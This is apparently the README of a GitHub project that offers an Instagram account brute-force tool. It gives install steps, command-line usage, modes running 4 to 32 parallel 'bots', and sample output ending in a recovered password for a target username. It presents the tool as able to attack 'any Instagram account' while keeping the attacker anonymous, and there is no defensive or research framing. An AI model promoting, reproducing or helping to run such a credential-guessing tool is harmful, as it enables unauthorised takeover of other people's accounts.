# TEAM TOXIC
## Author: github.com/TOXIC4LIEN
## INSTAGRAM BRUTEFORCE TOOL 

[![Version](https://img.shields.io/badge/Version-v2.1.1-blue)]()
[![Python](https://img.shields.io/badge/Python-v3.6%2B-blue)]()
[![Discord](https://img.shields.io/badge/Discord-server-blue)](https://discord.gg/)
[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/Vyshu101)

This program will brute force any Instagram account you send it its way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity, it only attacks when your identity is hidden.

### NOTICE

I'm no longer maintaining this project.

### Support me


### Requirements

-   Python _v3.x.x_
-   ~~Kali Linux 2.0~~
-   ~~TOR~~

### Install Dependencies

```
pip3 install -r requirements.txt
```

### Help

```
>python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

### Usage

```
python3 instagram.py <username> <wordlist> -m <mode>
```

### Bots(Threads)

-   4 bots: 64 passwords at a time
-   8 bots: 128 passwords at a time
-   16 bots: 256 passwords at a time
-   32 bots: 512 passwords at a time

### Modes

-   0: 32 bots
-   1: 16 bots
-   2: 8 bots
-   3: 4 bots

### Chill mode

This mode uses only 4 bots, or 64 passwords at a time.

```
>python3 instagram.py TOXIC.007 pass.lst -m 3
```

### Moderate mode 1

This mode uses 8 bots, or 128 passwords at a time.

```
>python3 instagram.py TOXIC.007 pass.lst -m 2
```

### Moderate mode 2

This mode uses 16 bots, or 256 passwords at a time.

```
>python3 instagram.py TOXIC.007 pass.lst -m 1
```

### Savage mode

This mode uses 32 bots, or 512 passwords at a time.

```
python3 instagram.py TOXIC.007 pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run

```
[-] Wordlist: pass.lst
[-] Username: TOXIC.007
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: pass.lst
[-] Username: TOXIC.007
[-] Password: WEREFG
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: TOXIC.007
[+] Password: WEREFG
```